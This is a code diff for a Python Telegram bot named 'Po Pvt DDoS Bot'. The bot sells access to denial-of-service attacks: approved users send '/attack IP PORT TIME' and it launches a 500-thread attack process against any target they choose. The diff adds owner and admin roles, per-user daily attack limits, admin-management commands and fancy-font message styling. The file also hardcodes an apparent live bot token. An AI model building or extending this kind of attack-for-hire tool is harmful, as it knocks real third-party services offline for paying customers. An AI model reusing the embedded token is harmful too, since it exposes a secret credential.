@@ -5,6 +5,7 @@ import subprocess
 import threading
 import time
 import json
+import re
 from fake_web import start_fake_service
 start_fake_service() 
 from datetime import datetime, timedelta
@@ -12,7 +13,13 @@ from datetime import datetime, timedelta
 # Setup
 logging.basicConfig(level=logging.INFO)
 TOKEN = '8364493942:AAECrpHcL8kGk0QXalmX9-WaBqGqDxFiCvs'
-ADMIN_IDS = [7954824886]
+
+# ============================================
+# ROLES & LIMITS
+# ============================================
+OWNER_IDS = [7954824886]  # Owner (Unlimited attacks, can add admins)
+DEFAULT_USER_LIMIT = 10   # Normal User daily limit
+ADMIN_LIMIT = 50          # Admin daily limit
 
 bot = telebot.TeleBot(TOKEN)
 
@@ -26,33 +33,59 @@ attack_counter = 0
 attack_lock = threading.Lock()
 
 # Slot system
-MAX_ACTIVE_ATTACKS = 5  # Maximum 2 concurrent attacks
+MAX_ACTIVE_ATTACKS = 5  # Maximum 5 concurrent attacks
 FREE_SLOTS = MAX_ACTIVE_ATTACKS
 
-# User plans
-USER_PLANS = {}  # {user_id: {'plan': 300, 'expiry': datetime, 'approved': True}}
+# Files
 APPROVED_USERS_FILE = "approved_users.json"
 USER_PLANS_FILE = "user_plans.json"
+ADMINS_FILE = "admins.json"
+USER_LIMITS_FILE = "user_limits.json"
+
+# ============================================
+# STYLISH FONT FORMATTER
+# ============================================
+def stylish(text):
+    normal = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+    stylish_chars = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
+    trans = str.maketrans(normal, stylish_chars)
+    
+    # Split by commands or URLs so they don't get translated (keeps them clickable)
+    parts = re.split(r'(/\w+|https?://[^\s]+)', text)
+    for i in range(0, len(parts), 2):
+        parts[i] = parts[i].translate(trans)
+    return "".join(parts)
 
 # ============================================
 # FILE HANDLING
 # ============================================
-def load_approved_users():
+def load_json_set(filepath, as_int=True):
     try:
-        with open(APPROVED_USERS_FILE, 'r') as f:
-            return set(json.load(f))
+        with open(filepath, 'r') as f:
+            data = json.load(f)
+            return set(int(x) if as_int else x for x in data)
     except FileNotFoundError:
         return set()
 
-def save_approved_users():
-    with open(APPROVED_USERS_FILE, 'w') as f:
-        json.dump(list(APPROVED_USERS), f)
+def save_json_set(filepath, data):
+    with open(filepath, 'w') as f:
+        json.dump(list(data), f)
+
+def load_json_dict(filepath):
+    try:
+        with open(filepath, 'r') as f:
+            return json.load(f)
+    except FileNotFoundError:
+        return {}
+
+def save_json_dict(filepath, data):
+    with open(filepath, 'w') as f:
+        json.dump(data, f)
 
 def load_user_plans():
     try:
         with open(USER_PLANS_FILE, 'r') as f:
             data = json.load(f)
-            # Convert expiry strings back to datetime
             for uid, plan in data.items():
                 plan['expiry'] = datetime.fromisoformat(plan['expiry'])
             return data
@@ -70,8 +103,10 @@ def save_user_plans():
     with open(USER_PLANS_FILE, 'w') as f:
         json.dump(data, f)
 
-APPROVED_USERS = load_approved_users()
+APPROVED_USERS = load_json_set(APPROVED_USERS_FILE)
+ADMINS = load_json_set(ADMINS_FILE)
 USER_PLANS = load_user_plans()
+USER_LIMITS = load_json_dict(USER_LIMITS_FILE)
 
 # ============================================
 # HELPER FUNCTIONS
@@ -92,39 +127,53 @@ def cleanup_old_attacks():
         for aid in expired:
             del active_attacks[aid]
 
+def is_admin(user_id):
+    return user_id in OWNER_IDS or user_id in ADMINS
+
 def is_approved(user_id):
-    if user_id in ADMIN_IDS:
+    if is_admin(user_id):
         return True
-    if user_id in USER_PLANS:
-        plan = USER_PLANS[user_id]
+    if str(user_id) in USER_PLANS:
+        plan = USER_PLANS[str(user_id)]
         if plan['expiry'] > datetime.now() and plan.get('approved', False):
             return True
     return user_id in APPROVED_USERS
 
 def get_user_plan_info(user_id):
-    if user_id in ADMIN_IDS:
-        return {'plan': 'Admin', 'expiry': 'Lifetime', 'approved': True}
-    if user_id in USER_PLANS:
-        plan = USER_PLANS[user_id]
+    if user_id in OWNER_IDS:
+        return {'plan': 'Owner', 'expiry': 'Lifetime', 'approved': True, 'role': 'Owner'}
+    if user_id in ADMINS:
+        return {'plan': 'Admin', 'expiry': 'Lifetime', 'approved': True, 'role': 'Admin'}
+        
+    if str(user_id) in USER_PLANS:
+        plan = USER_PLANS[str(user_id)]
         days_left = (plan['expiry'] - datetime.now()).days
         return {
             'plan': plan['plan'],
             'expiry': plan['expiry'].strftime('%Y-%m-%d %H:%M:%S'),
             'days_left': days_left,
-            'approved': plan.get('approved', False)
+            'approved': plan.get('approved', False),
+            'role': 'User'
         }
     return None
 
+def get_user_daily_limit(user_id):
+    if user_id in OWNER_IDS:
+        return float('inf')
+    if user_id in ADMINS:
+        return ADMIN_LIMIT
+    return USER_LIMITS.get(str(user_id), DEFAULT_USER_LIMIT)
+
 def approve_user_with_plan(user_id, plan_duration=300):
     expiry = datetime.now() + timedelta(days=1)  # 1 day plan
-    USER_PLANS[user_id] = {
+    USER_PLANS[str(user_id)] = {
         'plan': plan_duration,
         'expiry': expiry,
         'approved': True
     }
     APPROVED_USERS.add(user_id)
     save_user_plans()
-    save_approved_users()
+    save_json_set(APPROVED_USERS_FILE, APPROVED_USERS)
 
 # ============================================
 # COMMANDS
@@ -133,19 +182,18 @@ def approve_user_with_plan(user_id, plan_duration=300):
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user_id = message.from_user.id
-    username = message.from_user.username or message.from_user.first_name
     
     free_slots = get_free_slots()
     
     if is_approved(user_id):
         plan_info = get_user_plan_info(user_id)
-        status_text = f"✅ *APPROVED*\n📋 *Plan:* {plan_info['plan']}s\n⏰ *Valid:* {plan_info.get('days_left', 'Lifetime')} days left"
+        status_text = f"✅ *APPROVED*\n👑 *Role:* {plan_info['role']}\n📋 *Plan:* {plan_info['plan']}s\n⏰ *Valid:* {plan_info.get('days_left', 'Lifetime')} days left"
     else:
-        status_text = "⏳ *PENDING APPROVAL*\nContact owner for approval"
+        status_text = "⏳ *PENDING APPROVAL*\nContact owner or admin for approval"
     
     welcome_msg = (
         f"🎯 *Po Pvt DDoS Bot*\n\n"
-        f"👤*User ID:* {user_id}\n"
+        f"👤 *User ID:* {user_id}\n"
         f"{status_text}\n\n"
         f"📌 *Commands:*\n"
         f"🔹 /attack IP PORT TIME - Launch attack\n"
@@ -157,7 +205,7 @@ def send_welcome(message):
         f"🔹 /canary - HttpCanary download\n\n"
         f"🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free"
     )
-    bot.reply_to(message, welcome_msg, parse_mode="Markdown")
+    bot.reply_to(message, stylish(welcome_msg), parse_mode="Markdown")
 
 @bot.message_handler(commands=['attack'])
 def attack_command(message):
@@ -170,48 +218,48 @@ def attack_command(message):
     if not is_approved(user_id):
         bot.reply_to(
             message,
-            f"❌ *Access Denied!*\n\nYour account is not approved.\nContact /owner for approval.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free",
+            stylish(f"❌ *Access Denied!*\n\nYour account is not approved.\nContact /owner for approval.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"),
             parse_mode="Markdown"
         )
         return
     
     # Check if user has valid plan
     plan_info = get_user_plan_info(user_id)
-    if plan_info and plan_info.get('days_left', 0) < 0 and user_id not in ADMIN_IDS:
+    if plan_info and plan_info.get('days_left', 0) < 0 and not is_admin(user_id):
         bot.reply_to(
             message,
-            f"❌ *Plan Expired!*\n\nYour plan has expired. Contact /owner to renew.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free",
+            stylish(f"❌ *Plan Expired!*\n\nYour plan has expired. Contact owner to renew.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"),
             parse_mode="Markdown"
         )
         return
     
     # Check cooldown
-    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
+    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id] and user_id not in OWNER_IDS:
         remaining = int((user_cooldowns[user_id] - datetime.now()).seconds)
         free_slots = get_free_slots()
         bot.reply_to(
             message,
-            f"⏰ *Cooldown Active!*\n\nPlease wait {remaining} seconds before next attack.\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
+            stylish(f"⏰ *Cooldown Active!*\n\nPlease wait {remaining} seconds before next attack.\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free"),
             parse_mode="Markdown"
         )
         return
     
-    # Check daily limit (for non-admin)
-    if user_id not in ADMIN_IDS:
-        if user_attacks.get(user_id, 0) >= 50:
-            bot.reply_to(
-                message,
-                f"❌ *Daily Limit Reached!*\n\nYou have reached 50 attacks per day limit.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free",
-                parse_mode="Markdown"
-            )
-            return
+    # Check daily limit
+    daily_limit = get_user_daily_limit(user_id)
+    if user_attacks.get(user_id, 0) >= daily_limit:
+        bot.reply_to(
+            message,
+            stylish(f"❌ *Daily Limit Reached!*\n\nYou have reached your {daily_limit} attacks per day limit.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"),
+            parse_mode="Markdown"
+        )
+        return
     
     # Check available slots
     free_slots = get_free_slots()
     if free_slots <= 0:
         bot.reply_to(
             message,
-            f"❌ *API Error!*\n\nYou have {MAX_ACTIVE_ATTACKS} active attacks. Maximum allowed: {MAX_ACTIVE_ATTACKS}\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
+            stylish(f"❌ *API Error!*\n\nYou have {MAX_ACTIVE_ATTACKS} active attacks. Maximum allowed: {MAX_ACTIVE_ATTACKS}\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free"),
             parse_mode="Markdown"
         )
         return
@@ -221,7 +269,7 @@ def attack_command(message):
         if len(args) != 3:
             bot.reply_to(
                 message,
-                f"✅ *Ready to launch an attack?*\n\nFormat: `/attack <ip> <port> <duration>`\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
+                stylish(f"✅ *Ready to launch an attack?*\n\nFormat: `/attack <ip> <port> <duration>`\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free"),
                 parse_mode="Markdown"
             )
             return
@@ -231,16 +279,16 @@ def attack_command(message):
         # Validation
         parts = ip.split('.')
         if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
-            bot.reply_to(message, f"❌ *Invalid IP address!*\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")
+            bot.reply_to(message, stylish(f"❌ *Invalid IP address!*\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free"), parse_mode="Markdown")
             return
         
         if not port.isdigit() or not (1 <= int(port) <= 65535):
-            bot.reply_to(message, f"❌ *Invalid port!* (1-65535)\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")
+            bot.reply_to(message, stylish(f"❌ *Invalid port!* (1-65535)\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free"), parse_mode="Markdown")
             return
         
         duration = int(time_val)
         if duration < 1 or duration > 300:
-            bot.reply_to(message, f"❌ *Invalid duration!* (1-300 seconds)\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")
+            bot.reply_to(message, stylish(f"❌ *Invalid duration!* (1-300 seconds)\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free"), parse_mode="Markdown")
             return
         
         # Update stats
@@ -264,17 +312,16 @@ def attack_command(message):
         remaining_slots = get_free_slots()
         
         # Send attack started message
-        bot.reply_to(
-            message,
+        msg_text = (
             f"🚀 *Attack Initiated!*\n\n"
             f"🎯 *Target:* {ip}:{port}\n"
             f"⏰ *Duration:* {duration}s\n"
             f"⏳ *Time left:* {duration}s\n"
             f"🔧 *Threads:* 500\n\n"
             f"🟢 *Free Slots:* {remaining_slots}/{MAX_ACTIVE_ATTACKS}\n"
-            f"📊 *Slot Status:* {remaining_slots}/{MAX_ACTIVE_ATTACKS} free",
-            parse_mode="Markdown"
+            f"📊 *Slot Status:* {remaining_slots}/{MAX_ACTIVE_ATTACKS} free"
         )
+        bot.reply_to(message, stylish(msg_text), parse_mode="Markdown")
         
         # Start attack thread
         attack_thread = threading.Thread(
@@ -285,18 +332,20 @@ def attack_command(message):
         attack_thread.start()
         
     except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* {str(e)}\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")
+        bot.reply_to(message, stylish(f"❌ *Error:* {str(e)}\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"), parse_mode="Markdown")
 
 @bot.message_handler(commands=['status'])
 def status_command(message):
     user_id = message.from_user.id
     
     if not is_approved(user_id):
-        bot.reply_to(message, f"❌ *Access Denied!*\nContact /owner for approval.", parse_mode="Markdown")
+        bot.reply_to(message, stylish("❌ *Access Denied!*\nContact /owner for approval."), parse_mode="Markdown")
         return
     
     free_slots = get_free_slots()
     active_count = get_active_attacks_count()
+    daily_limit = get_user_daily_limit(user_id)
+    limit_str = "Unlimited" if daily_limit == float('inf') else daily_limit
     
     # Get user's active attacks
     user_active = []
@@ -318,9 +367,9 @@ def status_command(message):
     else:
         status_msg += "No active attacks"
     
-    status_msg += f"\n\n📈 *Total Today:* {user_attacks.get(user_id, 0)}/50"
+    status_msg += f"\n\n📈 *Total Today:* {user_attacks.get(user_id, 0)}/{limit_str}"
     
-    bot.reply_to(message, status_msg, parse_mode="Markdown")
+    bot.reply_to(message, stylish(status_msg), parse_mode="Markdown")
 
 @bot.message_handler(commands=['myinfo'])
 def myinfo_command(message):
@@ -328,21 +377,24 @@ def myinfo_command(message):
     username = message.from_user.username or message.from_user.first_name
     
     if not is_approved(user_id):
-        bot.reply_to(message, f"❌ *Access Denied!*\nContact /owner for approval.", parse_mode="Markdown")
+        bot.reply_to(message, stylish("❌ *Access Denied!*\nContact /owner for approval."), parse_mode="Markdown")
         return
     
     plan_info = get_user_plan_info(user_id)
+    daily_limit = get_user_daily_limit(user_id)
+    limit_str = "Unlimited" if daily_limit == float('inf') else daily_limit
     
     if plan_info:
         info_msg = (
             f"👤 *User Info*\n\n"
             f"📛 *Username:* @{username}\n"
             f"🆔 *User ID:* `{user_id}`\n"
+            f"👑 *Role:* {plan_info['role']}\n"
             f"✅ *Status:* Approved\n"
             f"📋 *Plan:* {plan_info['plan']} seconds\n"
             f"⏰ *Valid for:* {plan_info.get('days_left', 'Lifetime')} days\n"
             f"📅 *Expiry:* {plan_info.get('expiry', 'Never')}\n\n"
-            f"📊 *Today's Attacks:* {user_attacks.get(user_id, 0)}/50\n"
+            f"📊 *Today's Attacks:* {user_attacks.get(user_id, 0)}/{limit_str}\n"
             f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
         )
     else:
@@ -354,17 +406,16 @@ def myinfo_command(message):
             f"Contact /owner to get approved"
         )
     
-    bot.reply_to(message, info_msg, parse_mode="Markdown")
+    bot.reply_to(message, stylish(info_msg), parse_mode="Markdown")
 
 @bot.message_handler(commands=['when'])
 def when_command(message):
     user_id = message.from_user.id
     
     if not is_approved(user_id):
-        bot.reply_to(message, f"❌ *Access Denied!*", parse_mode="Markdown")
+        bot.reply_to(message, stylish("❌ *Access Denied!*"), parse_mode="Markdown")
         return
     
-    # Get user's active attacks
     user_active = []
     with attack_lock:
         for aid, attack in active_attacks.items():
@@ -380,36 +431,36 @@ def when_command(message):
         msg = "✅ *No active attacks*\n\nYou don't have any running attacks at the moment."
     
     msg += f"\n🟢 *Free Slots:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS}"
-    bot.reply_to(message, msg, parse_mode="Markdown")
+    bot.reply_to(message, stylish(msg), parse_mode="Markdown")
 
 @bot.message_handler(commands=['rules'])
 def rules_command(message):
     rules_msg = (
         f"📜 *Bot Rules*\n\n"
         f"1️⃣ Use attacks responsibly\n"
-        f"2️⃣ Maximum 50 attacks per day\n"
+        f"2️⃣ Limits apply based on your role\n"
         f"3️⃣ Maximum 300 seconds per attack\n"
         f"4️⃣ 30 seconds cooldown between attacks\n"
-        f"5️⃣ Max {MAX_ACTIVE_ATTACKS} concurrent attacks\n"
+        f"5️⃣ Max {MAX_ACTIVE_ATTACKS} concurrent attacks across server\n"
         f"6️⃣ Don't share bot with others\n"
         f"7️⃣ No attacking educational/government sites\n\n"
         f"⚠️ *Violation may lead to ban!*\n\n"
         f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
     )
-    bot.reply_to(message, rules_msg, parse_mode="Markdown")
+    bot.reply_to(message, stylish(rules_msg), parse_mode="Markdown")
 
 @bot.message_handler(commands=['owner'])
 def owner_command(message):
     owner_msg = (
         f"👑 *Bot Owner*\n\n"
         f"For approval, support, or queries:\n"
-        f"🆔 Admin ID: `{ADMIN_IDS[0]}`\n"
+        f"🆔 Owner ID: `{OWNER_IDS[0]}`\n"
         f"💬 Contact: @Pk_Chopra\n\n"
         f"💡 *To get approved:*\n"
-        f"Send your User ID to admin\n\n"
+        f"Send your User ID to admin or owner\n\n"
         f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
     )
-    bot.reply_to(message, owner_msg, parse_mode="Markdown")
+    bot.reply_to(message, stylish(owner_msg), parse_mode="Markdown")
 
 @bot.message_handler(commands=['canary'])
 def canary_command(message):
@@ -421,22 +472,81 @@ def canary_command(message):
         f"Use it to capture and analyze network packets\n\n"
         f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
     )
-    bot.reply_to(message, canary_msg, parse_mode="Markdown")
+    bot.reply_to(message, stylish(canary_msg), parse_mode="Markdown")
 
 # ============================================
-# ADMIN COMMANDS
+# ADMIN / OWNER COMMANDS
 # ============================================
+
+@bot.message_handler(commands=['addadmin'])
+def addadmin_command(message):
+    if message.from_user.id not in OWNER_IDS:
+        bot.reply_to(message, stylish("❌ *Owner only command!*"), parse_mode="Markdown")
+        return
+    try:
+        args = message.text.split()
+        if len(args) != 2:
+            bot.reply_to(message, stylish("❌ *Usage:* `/addadmin <user_id>`"), parse_mode="Markdown")
+            return
+        
+        target_id = int(args[1])
+        ADMINS.add(target_id)
+        save_json_set(ADMINS_FILE, ADMINS)
+        
+        bot.reply_to(message, stylish(f"✅ *Admin Added!*\n\nUser ID: `{target_id}` is now an Admin."), parse_mode="Markdown")
+    except Exception as e:
+        bot.reply_to(message, stylish(f"❌ *Error:* {str(e)}"), parse_mode="Markdown")
+
+@bot.message_handler(commands=['removeadmin'])
+def removeadmin_command(message):
+    if message.from_user.id not in OWNER_IDS:
+        bot.reply_to(message, stylish("❌ *Owner only command!*"), parse_mode="Markdown")
+        return
+    try:
+        args = message.text.split()
+        if len(args) != 2:
+            bot.reply_to(message, stylish("❌ *Usage:* `/removeadmin <user_id>`"), parse_mode="Markdown")
+            return
+        
+        target_id = int(args[1])
+        ADMINS.discard(target_id)
+        save_json_set(ADMINS_FILE, ADMINS)
+        
+        bot.reply_to(message, stylish(f"❌ *Admin Removed!*\n\nUser ID: `{target_id}` is no longer an Admin."), parse_mode="Markdown")
+    except Exception as e:
+        bot.reply_to(message, stylish(f"❌ *Error:* {str(e)}"), parse_mode="Markdown")
+
+@bot.message_handler(commands=['setlimit'])
+def setlimit_command(message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, stylish("❌ *Admin/Owner only command!*"), parse_mode="Markdown")
+        return
+    try:
+        args = message.text.split()
+        if len(args) != 3:
+            bot.reply_to(message, stylish("❌ *Usage:* `/setlimit <user_id> <daily_limit>`"), parse_mode="Markdown")
+            return
+        
+        target_id = args[1]
+        new_limit = int(args[2])
+        
+        USER_LIMITS[target_id] = new_limit
+        save_json_dict(USER_LIMITS_FILE, USER_LIMITS)
+        
+        bot.reply_to(message, stylish(f"✅ *Limit Updated!*\n\nUser ID: `{target_id}` now has a daily limit of {new_limit} attacks."), parse_mode="Markdown")
+    except Exception as e:
+        bot.reply_to(message, stylish(f"❌ *Error:* {str(e)}"), parse_mode="Markdown")
 
 @bot.message_handler(commands=['approve'])
 def approve_user_command(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, stylish("❌ *Admin/Owner only command!*"), parse_mode="Markdown")
         return
     
     try:
         args = message.text.split()
         if len(args) < 2:
-            bot.reply_to(message, "❌ *Usage:* `/approve <user_id> [plan_duration]`", parse_mode="Markdown")
+            bot.reply_to(message, stylish("❌ *Usage:* `/approve <user_id> [plan_duration]`"), parse_mode="Markdown")
             return
         
         target_id = int(args[1])
@@ -445,54 +555,58 @@ def approve_user_command(message):
         approve_user_with_plan(target_id, plan_duration)
         bot.reply_to(
             message,
-            f"✅ *User Approved!*\n\nUser ID: `{target_id}`\n📋 Plan: {plan_duration}s\n⏰ Valid for: 1 day\n\nThey can now use /attack command",
+            stylish(f"✅ *User Approved!*\n\nUser ID: `{target_id}`\n📋 Plan: {plan_duration}s\n⏰ Valid for: 1 day\n\nThey can now use /attack command"),
             parse_mode="Markdown"
         )
     except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* {str(e)}", parse_mode="Markdown")
+        bot.reply_to(message, stylish(f"❌ *Error:* {str(e)}"), parse_mode="Markdown")
 
 @bot.message_handler(commands=['remove'])
 def remove_user_command(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, stylish("❌ *Admin/Owner only command!*"), parse_mode="Markdown")
         return
     
     try:
         args = message.text.split()
         if len(args) != 2:
-            bot.reply_to(message, "❌ *Usage:* `/remove <user_id>`", parse_mode="Markdown")
+            bot.reply_to(message, stylish("❌ *Usage:* `/remove <user_id>`"), parse_mode="Markdown")
             return
         
         target_id = int(args[1])
         
-        if target_id in ADMIN_IDS:
-            bot.reply_to(message, "❌ *Cannot remove admin!*", parse_mode="Markdown")
+        if target_id in OWNER_IDS:
+            bot.reply_to(message, stylish("❌ *Cannot remove Owner!*"), parse_mode="Markdown")
+            return
+            
+        if target_id in ADMINS and message.from_user.id not in OWNER_IDS:
+            bot.reply_to(message, stylish("❌ *Only Owner can remove Admins!*"), parse_mode="Markdown")
             return
         
         APPROVED_USERS.discard(target_id)
         if str(target_id) in USER_PLANS:
             del USER_PLANS[str(target_id)]
         save_user_plans()
-        save_approved_users()
+        save_json_set(APPROVED_USERS_FILE, APPROVED_USERS)
         
-        bot.reply_to(message, f"❌ *User Removed!*\n\nUser ID: `{target_id}`\nApproval revoked.", parse_mode="Markdown")
+        bot.reply_to(message, stylish(f"❌ *User Removed!*\n\nUser ID: `{target_id}`\nApproval revoked."), parse_mode="Markdown")
     except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* {str(e)}", parse_mode="Markdown")
+        bot.reply_to(message, stylish(f"❌ *Error:* {str(e)}"), parse_mode="Markdown")
 
 @bot.message_handler(commands=['reset_TF'])
 def reset_all_limits(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, stylish("❌ *Admin/Owner only command!*"), parse_mode="Markdown")
         return
     
     user_attacks.clear()
     user_cooldowns.clear()
-    bot.reply_to(message, "🔄 *All limits have been reset by ADMIN!*", parse_mode="Markdown")
+    bot.reply_to(message, stylish("🔄 *All limits have been reset by ADMIN!*"), parse_mode="Markdown")
 
 @bot.message_handler(commands=['slots'])
 def slots_command(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, stylish("❌ *Admin/Owner only command!*"), parse_mode="Markdown")
         return
     
     free_slots = get_free_slots()
@@ -506,7 +620,7 @@ def slots_command(message):
                 remaining = int((attack['end_time'] - datetime.now()).seconds)
                 msg += f"🔹 #{aid}: {attack['target']} - {remaining}s - @{attack['username']}\n"
     
-    bot.reply_to(message, msg, parse_mode="Markdown")
+    bot.reply_to(message, stylish(msg), parse_mode="Markdown")
 
 # ============================================
 # ATTACK EXECUTION
@@ -523,7 +637,6 @@ def execute_attack_with_timer(attack_id, ip, port, duration, username, user_id, 
         for remaining in range(duration, 0, -30):
             if remaining > 0:
                 time.sleep(30)
-                # Check if attack still exists
                 with attack_lock:
                     if attack_id not in active_attacks:
                         process.kill()
@@ -531,26 +644,24 @@ def execute_attack_with_timer(attack_id, ip, port, duration, username, user_id, 
         
         stdout, stderr = process.communicate(timeout=duration + 10)
         
-        # Send completion message
         free_slots = get_free_slots()
         bot.send_message(
             chat_id,
-            f"✅ *Attack Completed!*\n\n🎯 Target: {ip}:{port}\n⏰ Duration: {duration}s\n👤 By: @{username}\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
+            stylish(f"✅ *Attack Completed!*\n\n🎯 Target: {ip}:{port}\n⏰ Duration: {duration}s\n👤 By: @{username}\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free"),
             parse_mode="Markdown"
         )
         
-        # Notify admin
         bot.send_message(
-            ADMIN_IDS[0],
-            f"✅ *Attack Completed*\n🎯 {ip}:{port}\n👤 @{username}\n⏰ {duration}s",
+            OWNER_IDS[0],
+            stylish(f"✅ *Attack Completed*\n🎯 {ip}:{port}\n👤 @{username}\n⏰ {duration}s"),
             parse_mode="Markdown"
         )
         
     except subprocess.TimeoutExpired:
         process.kill()
-        bot.send_message(ADMIN_IDS[0], f"⚠️ *Attack Timeout*\n🎯 {ip}:{port}\n👤 @{username}", parse_mode="Markdown")
+        bot.send_message(OWNER_IDS[0], stylish(f"⚠️ *Attack Timeout*\n🎯 {ip}:{port}\n👤 @{username}"), parse_mode="Markdown")
     except Exception as e:
-        bot.send_message(ADMIN_IDS[0], f"❌ *Attack Failed*\n👤 @{username}\nError: {str(e)}", parse_mode="Markdown")
+        bot.send_message(OWNER_IDS[0], stylish(f"❌ *Attack Failed*\n👤 @{username}\nError: {str(e)}"), parse_mode="Markdown")
     finally:
         with attack_lock:
             if attack_id in active_attacks:
@@ -565,7 +676,6 @@ def cleanup_thread():
         time.sleep(10)
         cleanup_old_attacks()
 
-# Start cleanup thread
 cleanup_thread_obj = threading.Thread(target=cleanup_thread, daemon=True)
 cleanup_thread_obj.start()
 
@@ -578,7 +688,8 @@ if __name__ == "__main__":
     print("🎯 Po Pvt DDoS Bot Starting...")
     print("=" * 50)
     print(f"📊 Max Attacks: {MAX_ACTIVE_ATTACKS}")
-    print(f"👑 Admins: {ADMIN_IDS}")
+    print(f"👑 Owners: {OWNER_IDS}")
+    print(f"🛡️  Admins: {len(ADMINS)}")
     print(f"✅ Approved Users: {len(APPROVED_USERS)}")
     print(f"🟢 Free Slots: {MAX_ACTIVE_ATTACKS}")
     print("=" * 50)
